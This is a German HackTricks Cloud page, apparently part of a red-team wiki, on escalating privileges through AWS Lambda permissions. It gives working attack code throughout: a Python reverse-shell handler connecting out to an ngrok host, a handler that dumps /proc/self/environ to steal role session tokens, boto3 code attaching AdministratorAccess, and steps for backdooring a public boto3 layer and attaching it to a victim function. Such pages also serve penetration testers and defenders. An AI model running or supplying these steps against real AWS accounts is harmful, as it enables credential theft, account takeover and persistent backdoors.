# AWS - Lambda Privilegieneskalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

## lambda

Weitere Informationen zu Lambda finden Sie unter:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Benutzer mit den Berechtigungen **`iam:PassRole`, `lambda:CreateFunction` und `lambda:InvokeFunction`** k√∂nnen ihre Privilegien eskalieren.\
Sie k√∂nnen eine **neue Lambda-Funktion erstellen und ihr eine vorhandene IAM-Rolle zuweisen**, wodurch der Funktion die mit dieser Rolle verbundenen Berechtigungen gew√§hrt werden. Der Benutzer kann dann **Code f√ºr diese Lambda-Funktion schreiben und hochladen (zum Beispiel mit einer Reverse-Shell)**.\
Sobald die Funktion eingerichtet ist, kann der Benutzer **deren Ausf√ºhrung ausl√∂sen** und die beabsichtigten Aktionen durch Aufrufen der Lambda-Funktion √ºber die AWS-API ausf√ºhren. Auf diese Weise kann der Benutzer effektiv Aufgaben indirekt √ºber die Lambda-Funktion ausf√ºhren und dabei mit dem Zugriffsniveau arbeiten, das der mit ihr verbundenen IAM-Rolle gew√§hrt wurde.\\

Ein Angreifer k√∂nnte dies missbrauchen, um eine **Reverse-Shell zu erhalten und das Token zu stehlen**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Du k√∂nntest auch **die Berechtigungen der Lambda-Rolle missbrauchen** direkt von der Lambda-Funktion aus.\
Wenn die Lambda-Rolle ausreichend Berechtigungen hatte, k√∂nntest du sie nutzen, um dir Admin-Rechte zu gew√§hren:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Es ist auch m√∂glich, die Rollenberechtigungen der Lambda auszulesen, ohne eine externe Verbindung zu ben√∂tigen. Dies w√§re n√ºtzlich f√ºr **Netzwerkisolierte Lambdas**, die f√ºr interne Aufgaben verwendet werden. Wenn unbekannte Sicherheitsgruppen Ihre Reverse-Shells filtern, erm√∂glicht Ihnen dieses Code-St√ºck, die Berechtigungen direkt als Ausgabe der Lambda auszulesen.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potenzielle Auswirkungen:** Direktes Privilege Escalation auf die angegebene Lambda-Service-Rolle.

{% hint style="danger" %}
Beachten Sie, dass selbst wenn es interessant aussieht, **`lambda:InvokeAsync`** allein nicht die Ausf√ºhrung von **`aws lambda invoke-async`** erm√∂glicht. Sie ben√∂tigen auch `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Wie im vorherigen Szenario k√∂nnen Sie sich die Berechtigung **`lambda:InvokeFunction`** erteilen, wenn Sie die Berechtigung **`lambda:AddPermission`** haben.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum angegebenen Lambda-Service-Rolle.

Benutzer mit den Berechtigungen **`iam:PassRole`, `lambda:CreateFunction` und `lambda:CreateEventSourceMapping`** (und m√∂glicherweise `dynamodb:PutItem` und `dynamodb:CreateTable`) k√∂nnen indirekt **Privilegien eskalieren**, selbst ohne `lambda:InvokeFunction`.\
Sie k√∂nnen eine **Lambda-Funktion mit b√∂sartigem Code erstellen und ihr eine vorhandene IAM-Rolle zuweisen**.

Anstatt die Lambda direkt aufzurufen, richtet der Benutzer eine vorhandene DynamoDB-Tabelle ein oder nutzt sie, indem er sie mit der Lambda √ºber ein Ereignisquellen-Mapping verkn√ºpft. Diese Einrichtung stellt sicher, dass die Lambda-Funktion automatisch ausgel√∂st wird, wenn ein neuer Eintrag in der Tabelle erfolgt, entweder durch die Aktion des Benutzers oder einen anderen Prozess, wodurch die Lambda-Funktion indirekt aufgerufen und der Code mit den Berechtigungen der √ºbergebenen IAM-Rolle ausgef√ºhrt wird.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Wenn DynamoDB bereits in der AWS-Umgebung aktiv ist, muss der Benutzer nur die Ereignisquellenzuordnung f√ºr die Lambda-Funktion einrichten. Wenn DynamoDB jedoch nicht verwendet wird, muss der Benutzer eine neue Tabelle mit aktiviertem Streaming erstellen:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Jetzt ist es m√∂glich, die Lambda-Funktion mit der DynamoDB-Tabelle zu verbinden, indem Sie ein Ereignisquellen-Mapping erstellen:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Mit der Lambda-Funktion, die mit dem DynamoDB-Stream verkn√ºpft ist, kann der Angreifer **die Lambda indirekt ausl√∂sen, indem er den DynamoDB-Stream aktiviert**. Dies kann erreicht werden, indem er **einen Eintrag** in die DynamoDB-Tabelle einf√ºgt:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum angegebenen Lambda-Service-Rolle.

### `lambda:AddPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) beliebige Berechtigungen gew√§hren** (dies generiert ressourcenbasierte Richtlinien, um Zugriff auf die Ressource zu gew√§hren):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potenzielle Auswirkungen:** Direktes Privilegien-Eskalation zum Lambda-Service-Rolle durch Berechtigung zur Code-√Ñnderung und Ausf√ºhrung.

### `lambda:AddLayerVersionPermission`

Ein Angreifer mit dieser Berechtigung kann sich selbst (oder anderen) die Berechtigung `lambda:GetLayerVersion` gew√§hren. Er k√∂nnte auf die Ebene zugreifen und nach Schwachstellen oder sensiblen Informationen suchen.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potenzielle Auswirkungen:** Potenzieller Zugriff auf sensible Informationen.

### `lambda:UpdateFunctionCode`

Benutzer mit der Berechtigung **`lambda:UpdateFunctionCode`** haben das Potenzial, **den Code einer vorhandenen Lambda-Funktion zu √§ndern, die mit einer IAM-Rolle verkn√ºpft ist.**\
Der Angreifer kann **den Code des Lambda √§ndern, um die IAM-Anmeldeinformationen abzufangen**.

Obwohl der Angreifer m√∂glicherweise nicht direkt in der Lage ist, die Funktion aufzurufen, ist es wahrscheinlich, dass die Lambda-Funktion bereits vorhanden und funktionsf√§hig ist und somit durch bestehende Workflows oder Ereignisse ausgel√∂st wird, was die Ausf√ºhrung des modifizierten Codes indirekt erm√∂glicht.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potenzielle Auswirkungen:** Direkter Privilege Escalation zum verwendeten Lambda-Service-Rolle.

### `lambda:UpdateFunctionConfiguration`

#### Einf√ºhrung

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) erm√∂glicht es, **Code** in Ihre Lambda-Funktion einzuschlie√üen, ihn jedoch **getrennt zu speichern**, sodass der Funktionscode klein bleiben kann und **mehrere Funktionen Code teilen k√∂nnen**.

Innerhalb von Lambda k√∂nnen Sie die Pfade √ºberpr√ºfen, von denen aus der Python-Code mit einer Funktion wie der folgenden geladen wird:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Das sind die Orte:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Zum Beispiel wird die Bibliothek boto3 aus `/var/runtime/boto3` (4. Position) geladen.

#### Ausnutzung

Es ist m√∂glich, die Berechtigung `lambda:UpdateFunctionConfiguration` zu missbrauchen, um **eine neue Schicht** zu einer Lambda-Funktion hinzuzuf√ºgen. Um beliebigen Code auszuf√ºhren, muss diese Schicht einige **Bibliothek enthalten, die die Lambda importieren wird.** Wenn Sie den Code der Lambda lesen k√∂nnen, k√∂nnten Sie dies leicht finden. Beachten Sie auch, dass es m√∂glich sein k√∂nnte, dass die Lambda bereits eine Schicht verwendet und Sie die Schicht **herunterladen** und **Ihren Code hinzuf√ºgen** k√∂nnten.

Angenommen, die Lambda verwendet beispielsweise die Bibliothek boto3, dann wird eine lokale Schicht mit der neuesten Version der Bibliothek erstellt:
```
pip3 install -t ./lambda_layer boto3
```
Du kannst `./lambda_layer/boto3/__init__.py` √∂ffnen und **die Hintert√ºr im globalen Code hinzuf√ºgen** (zum Beispiel eine Funktion zum Exfiltrieren von Anmeldedaten oder zum Erhalten einer Reverse-Shell).

Dann zippe das `./lambda_layer` Verzeichnis und **lade die neue Lambda-Schicht hoch** in dein eigenes Konto (oder in das des Opfers, aber du hast m√∂glicherweise keine Berechtigungen daf√ºr).\
Beachte, dass du einen Python-Ordner erstellen musst und die Bibliotheken dort platzieren musst, um `/opt/python/boto3` zu √ºberschreiben. Au√üerdem muss die Schicht **mit der Python-Version kompatibel sein**, die von der Lambda verwendet wird, und wenn du sie in dein Konto hochl√§dst, muss sie in der **gleichen Region sein:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Jetzt machen Sie die hochgeladene Lambda-Schicht f√ºr **jedes Konto zug√§nglich**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Und f√ºgen Sie die Lambda-Schicht der Opfer-Lambda-Funktion hinzu:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Der n√§chste Schritt w√§re entweder die **Funktion selbst aufzurufen**, falls wir k√∂nnen, oder darauf zu warten, dass sie auf normalem Weg aufgerufen wird - was die sicherere Methode ist.

Ein **unauff√§lligerer Weg, diese Schwachstelle auszunutzen**, kann in gefunden werden:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potenzielle Auswirkungen:** Direkter Privilege Escalation zum verwendeten Lambda-Service-Rolle.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Vielleicht kannst du mit diesen Berechtigungen eine Funktion erstellen und sie aufrufen, indem du die URL aufrufst... aber ich konnte keinen Weg finden, es zu testen, also lass es mich wissen, wenn du es schaffst!

### Lambda MitM

Einige Lambdas werden **sensible Informationen von den Benutzern in Parametern erhalten.** Wenn du RCE in einer davon bekommst, kannst du die Informationen exfiltrieren, die andere Benutzer an sie senden, √ºberpr√ºfe es in:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referenzen

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Lerne AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn du deine **Firma in HackTricks beworben sehen m√∂chtest** oder **HackTricks als PDF herunterladen m√∂chtest**, √ºberpr√ºfe die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Hol dir das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecke [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Trete der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile deine Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichst.

</details>
